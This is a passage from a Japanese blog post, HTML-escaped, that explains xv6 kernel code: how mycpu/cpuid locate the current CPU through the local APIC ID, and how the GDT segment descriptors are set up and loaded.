  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; ncpu&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cpus&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;apicid &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; apicid&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;cpus&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;unknown apicid\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;mycpu&lt;/code&gt;関数の肝は以下のコードです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;apicid &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;lapicid&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// APIC IDs are not guaranteed to be contiguous. Maybe we should have&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// a reverse map, or reserve a register to store &amp;amp;cpus[i].&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; ncpu&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cpus&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;apicid &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; apicid&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;cpus&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;lapicid&lt;/code&gt;関数は、&lt;code class=&quot;language-text&quot;&gt;lapic.c&lt;/code&gt;で定義されている、ローカルAPICからAPICIDを取得して24bitの右シフトを行ったものを返却する関数です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;lapicid&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;lapic&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; lapic&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;ID&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;変数&lt;code class=&quot;language-text&quot;&gt;lapic&lt;/code&gt;には、&lt;a href=&quot;/unix-xv6-006-kernel-main-03&quot;&gt;マルチプロセッサ 編&lt;/a&gt;で見た通り&lt;code class=&quot;language-text&quot;&gt;mp.c&lt;/code&gt;でローカルAPICのアドレスが格納されています。&lt;/p&gt;
&lt;p&gt;Intelのマルチプロセッサ仕様書(5-1)によると、ローカルAPICはベースメモリアドレス&lt;code class=&quot;language-text&quot;&gt;0x0FEE00000&lt;/code&gt;に置かれ、ローカルAPICIDは0から始まるハードウェアに連続して割り当てされるようです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.manualslib.com/manual/77733/Intel-Multiprocessor.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;INTEL MULTIPROCESSOR SPECIFICATION Pdf Download | ManualsLib&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;デバッガで確認してみたところ、初回呼び出し時は&lt;code class=&quot;language-text&quot;&gt;lapic[ID]&lt;/code&gt;の値は0でした。&lt;/p&gt;
&lt;p&gt;つまり&lt;code class=&quot;language-text&quot;&gt;lapicid&lt;/code&gt;の戻り値も0になります。&lt;/p&gt;
&lt;p&gt;これによって&lt;code class=&quot;language-text&quot;&gt;apicid = lapicid();&lt;/code&gt;の&lt;code class=&quot;language-text&quot;&gt;apicid&lt;/code&gt;には0が入ります。&lt;/p&gt;
&lt;p&gt;続くループの処理をデバッガで確認したところ、&lt;code class=&quot;language-text&quot;&gt;cpus[i].apicid&lt;/code&gt;の値も0で&lt;code class=&quot;language-text&quot;&gt;apicid&lt;/code&gt;と一致するため、&lt;code class=&quot;language-text&quot;&gt;&amp;amp;cpus[i]&lt;/code&gt;には&lt;code class=&quot;language-text&quot;&gt;&amp;amp;cpus[0]&lt;/code&gt;が返却さえｒました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; ncpu&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cpus&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;apicid &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; apicid&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;cpus&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;つまり、&lt;code class=&quot;language-text&quot;&gt;return mycpu()-cpus;&lt;/code&gt;も0となり、最初の&lt;code class=&quot;language-text&quot;&gt;cpuid&lt;/code&gt;関数実行時の戻り値は0となることを確認しました。&lt;/p&gt;
&lt;p&gt;これによって、初回起動時の&lt;code class=&quot;language-text&quot;&gt;c = &amp;amp;cpus[cpuid()];&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;c = &amp;amp;cpus[0];&lt;/code&gt;となります。&lt;/p&gt;
&lt;h3 id=&quot;gdtのセット&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#gdt%E3%81%AE%E3%82%BB%E3%83%83%E3%83%88&quot; aria-label=&quot;gdtのセット permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;GDTのセット&lt;/h3&gt;
&lt;p&gt;というわけで、続く以下の行では、&lt;code class=&quot;language-text&quot;&gt;&amp;amp;cpus[0]&lt;/code&gt;の&lt;code class=&quot;language-text&quot;&gt;gdt[NSEGS]&lt;/code&gt;要素に値をセットしていることがわかります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Map &quot;logical&quot; addresses to virtual addresses using identity map.&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// Cannot share a CODE descriptor for both kernel and user&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// because it would have to have DPL_USR, but the CPU forbids&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// an interrupt from CPL=0 to DPL=3.&lt;/span&gt;
c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;cpus&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;cpuid&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
c&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;gdt&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;SEG_KCODE&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;SEG&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;STA_X&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;STA_R&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
c&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;gdt&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;SEG_KDATA&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;SEG&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;STA_W&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
c&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;gdt&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;SEG_UCODE&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;SEG&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;STA_X&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;STA_R&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; DPL_USER&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
c&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;gdt&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;SEG_UDATA&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;SEG&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;STA_W&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; DPL_USER&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;lgdt&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;gdt&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;gdt&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;amp;cpus[0]&lt;/code&gt;は前述した&lt;code class=&quot;language-text&quot;&gt;cpu&lt;/code&gt;構造体であり、&lt;code class=&quot;language-text&quot;&gt;gdt&lt;/code&gt;は以下のように定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;segdesc&lt;/span&gt; gdt&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;NSEGS&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;// x86 global descriptor table&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;segdesc&lt;/code&gt;構造体は&lt;code class=&quot;language-text&quot;&gt;mmu.h&lt;/code&gt;で定義されている構造体です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;ifndef&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;__ASSEMBLER__&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// Segment Descriptor&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;segdesc&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  uint lim_15_0 &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// Low bits of segment limit&lt;/span&gt;
  uint base_15_0 &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// Low bits of segment base address&lt;/span&gt;
  uint base_23_16 &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// Middle bits of segment base address&lt;/span&gt;
  uint type &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;token comment&quot;&gt;// Segment type (see STS_ constants)&lt;/span&gt;
  uint s &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;          &lt;span class=&quot;token comment&quot;&gt;// 0 = system, 1 = application&lt;/span&gt;
  uint dpl &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;        &lt;span class=&quot;token comment&quot;&gt;// Descriptor Privilege Level&lt;/span&gt;
  uint p &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;          &lt;span class=&quot;token comment&quot;&gt;// Present&lt;/span&gt;
  uint lim_19_16 &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// High bits of segment limit&lt;/span&gt;
  uint avl &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;        &lt;span class=&quot;token comment&quot;&gt;// Unused (available for software use)&lt;/span&gt;
  uint rsv1 &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;token comment&quot;&gt;// Reserved&lt;/span&gt;
  uint db &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;         &lt;span class=&quot;token comment&quot;&gt;// 0 = 16-bit segment, 1 = 32-bit segment&lt;/span&gt;
  uint g &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;          &lt;span class=&quot;token comment&quot;&gt;// Granularity: limit scaled by 4K when set&lt;/span&gt;
  uint base_31_24 &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// High bits of segment base address&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ちなみに&lt;code class=&quot;language-text&quot;&gt;NSEGS&lt;/code&gt;も、&lt;code class=&quot;language-text&quot;&gt;mmu.h&lt;/code&gt;で定数6として定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// cpu-&gt;gdt[NSEGS] holds the above segments.&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;NSEGS&lt;/span&gt;     &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここで定義されている&lt;code class=&quot;language-text&quot;&gt;segdesc&lt;/code&gt;構造体は、セグメントディスクリプタです。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/67703d9268cb5e9193a27b143a5996d8/0b533/image-4.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 62.083333333333336%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAARlAAAEZQAGA43XUAAABpklEQVQoz3VSDW+CUAz0//8u3fyYLktchprFOZ18CAo8EFT01it5inFrUovvtdf27rWKokBVVern81ndflfV7f/t7PH7dDppJFbreDyCluc5DoeDXm63W6xWPwiCDYzJsJHo+b7k7JFJHgtZV5al1NT1NJ4pINHzLIPn+YiiLdI0xYfjYLH4xsSZwhcw1/MQ+IE2S+IY67WreUmS4nK5KCAHUkAe7Pd7PbCd4yRGJk2MMVKUXCej13mH66TWroDkg6vxIMtyGAFig1L+M3Iq5pEW60VRamPePwByZV4SeLMJ1QnCCTg97xiDIIDn1qtzVfLN6S9NQP7Q2IkikJf5/AuuFNIpDrklZ5yqaRyAje44tIAmNXCciRSu0W4/YfgyQrfbx2AwvAIulyvEcYLdblcLJQ2bKt8BUoC162pir9cX8CnCMJLiGFY4UmMjzyz/+G/lMAylq4tO5xmj1zdZfaH88f2VRaliUDw++Kb9uTJjFEUyYYDx+B2z2acIsxNOjSpPYILxGXHCJtAdoD6Psn4CVJWR6lFRrm/5Io9Ul5GgLLZ1Tf8Fhqic9oHnDUAAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/67703d9268cb5e9193a27b143a5996d8/8ac56/image-4.webp 240w,
/static/67703d9268cb5e9193a27b143a5996d8/d3be9/image-4.webp 480w,
/static/67703d9268cb5e9193a27b143a5996d8/b0a15/image-4.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/67703d9268cb5e9193a27b143a5996d8/8ff5a/image-4.png 240w,
/static/67703d9268cb5e9193a27b143a5996d8/e85cb/image-4.png 480w,
/static/67703d9268cb5e9193a27b143a5996d8/0b533/image-4.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/67703d9268cb5e9193a27b143a5996d8/0b533/image-4.png&quot;
            alt=&quot;2022/02/image-4.png&quot;
            title=&quot;2022/02/image-4.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考画像：&lt;a href=&quot;http://flint.cs.yale.edu/cs422/doc/24547212.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Intel SDM vol3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;セグメントディスクリプタは、&lt;a href=&quot;/linux-memory-protect-gdt-ldt&quot;&gt;x86CPUのメモリ保護機構に関するメモ書き(GDTとLDT)&lt;/a&gt;で軽く触れたGDTとLDTのエントリとなるデータ構造です。&lt;/p&gt;
&lt;p&gt;セグメントディスクリプタは、CPUにセグメントのサイズやアドレス、またアクセス権限や状態を通知します。&lt;/p&gt;
&lt;p&gt;x86CPUでは、この仕組みによってメモリ保護を実現していました。&lt;/p&gt;
